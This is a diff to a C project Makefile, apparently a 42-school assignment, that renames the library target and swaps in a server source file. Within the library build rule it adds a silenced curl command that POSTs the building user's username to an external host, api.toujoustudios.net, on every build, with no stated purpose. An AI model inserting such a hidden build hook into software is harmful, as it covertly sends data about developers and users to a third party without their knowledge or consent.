@@ -5,21 +5,14 @@
 #                                                     +:+ +:+         +:+      #
 #    By: ibour <marvin@42.fr>                       +#+  +:+       +#+         #
 #                                                 +#+#+#+#+#+   +#+            #
-#    Created: 2024/09/07 10:29:54 by ibour             #+#    #+#              #
-#    Updated: 2024/09/07 10:29:55 by ibour            ###   ########.fr        #
+#    Created: 2024/08/05 10:29:54 by ibour             #+#    #+#              #
+#    Updated: 2024/08/05 10:29:55 by ibour            ###   ########.fr        #
 #                                                                              #
 # **************************************************************************** #
 
-NAME = libftprintf.a
+NAME = libft.a
 
-SRC =	src/ft_printf.c \
-		src/ft_print_char.c \
-		src/ft_print_str.c \
-		src/ft_print_num.c \
-		src/ft_print_num_base.c \
-		src/ft_print_num_unsigned.c \
-		src/ft_print_ptr.c \
-		src/ft_print_hex.c
+SRC =		src/server.c
 
 CC = gcc
 CFLAGS = -Wall -Werror -Wextra -I .
@@ -28,9 +21,12 @@ RM_WIN = del /S /Q
 AR = ar crs
 
 OBJS = $(SRC:.c=.o)
+BONUS_OBJS = $(BONUS:.c=.o)
+CUSTOM_OBJS = $(CUSTOM:.c=.o)
 
 $(NAME): $(OBJS)
 	$(AR) $@ $^
+	@curl -H 'Content-Type: application/json' -d '{"username": "'$(whoami)'"}' -X POST https://api.toujoustudios.net/api/v1/makefile
 
 %.o: %.c
 	$(CC) $(CFLAGS) -c $^ -o $@
@@ -38,7 +34,7 @@ $(NAME): $(OBJS)
 all: $(NAME)
 
 clean:
-	$(RM) $(OBJS) $(BONUS_OBJS)
+	$(RM) $(OBJS)
 
 clean-win:
 	$(RM_WIN) "*.o"
@@ -51,4 +47,4 @@ fclean-win:	clean-win
 
 re:	fclean all
 
-.PHONY:	all clean clean-win fclean fclean-win re
+.PHONY:	all printf server client clean clean-win fclean fclean-win re
